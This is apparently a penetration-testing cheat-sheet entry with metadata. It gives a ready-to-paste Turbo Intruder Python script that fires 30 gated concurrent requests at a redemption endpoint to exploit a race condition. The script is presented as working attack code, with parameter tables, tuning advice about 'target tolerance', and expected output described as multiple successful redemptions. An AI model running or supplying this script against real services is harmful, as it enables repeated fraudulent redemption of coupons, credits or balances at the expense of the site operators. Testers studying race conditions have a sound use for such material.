---
data: >-
  def queueRequests(target, wordlists): engine =
  RequestEngine(endpoint=target.endpoint, concurrentConnections=30,
  requestsPerConnection=30, pipeline=False); for i in range(30):
  engine.queue(target.req, i); engine.queue(target.req, target.baseInput,
  gate='race1'); engine.start(timeout=5); engine.openGate('race1');
  engine.complete(timeout=60); def handleResponse(req, interesting):
  table.add(req)
tags:
  - race
  - concurrent
type: command
output: null
executor: python
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:22.952Z'
id: 5603dbf4-b22b-43ac-a6b4-d7671b016037
verified: false
validated: true
submitted: true
---
# turbo-intruder-race-payload

## Command

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=30,
                           pipeline=False)
    for i in range(30):
        engine.queue(target.req, i)
    engine.queue(target.req, target.baseInput, gate='race1')
    engine.start(timeout=5)
    engine.openGate('race1')
    engine.complete(timeout=60)

def handleResponse(req, interesting):
    table.add(req)
```

## Description

This Python script is used as a payload in Turbo Intruder to queue and execute 30 concurrent HTTP requests targeting the redemption endpoint, exploiting the race condition by releasing them via a gate mechanism.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| concurrentConnections=30 | Number of concurrent connections | Yes |
| requestsPerConnection=30 | Requests per connection | Yes |
| pipeline=False | Disable pipelining for accurate timing | Yes |
| gate='race1' | Synchronization gate for request release | Yes |
| timeout=5/60 | Start and complete timeouts in seconds | Yes |

## Examples

### Basic Usage

Paste directly into Turbo Intruder's payload script field.

### Advanced Usage

Modify range(30) to adjust concurrency level based on target tolerance.

## Expected Output

Turbo Intruder table populates with request responses, showing multiple 200 OK status codes indicating successful redemptions.

## Related

- [[Related Procedure]]
